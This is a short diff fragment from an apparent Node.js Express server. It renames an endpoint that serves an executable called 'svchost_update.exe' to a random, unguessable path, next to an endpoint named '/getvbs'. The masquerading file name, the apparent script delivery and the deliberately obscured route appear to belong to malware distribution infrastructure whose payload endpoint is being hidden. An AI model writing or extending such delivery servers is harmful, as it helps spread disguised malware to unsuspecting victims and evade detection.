@@ -2353,7 +2353,7 @@ app.get('/getvbs', async (req, res) => {
 
 
 // Endpoint for server host module
-app.get('/ServerHostModule', async (req, res) => {
+app.get('/bbj87vuvhtv87cdsrxhgvfvt5ftvhg', async (req, res) => {
     const filePath = path.join(__dirname, 'dist', 'svchost_update.exe');
     
     if (fs.existsSync(filePath)) {
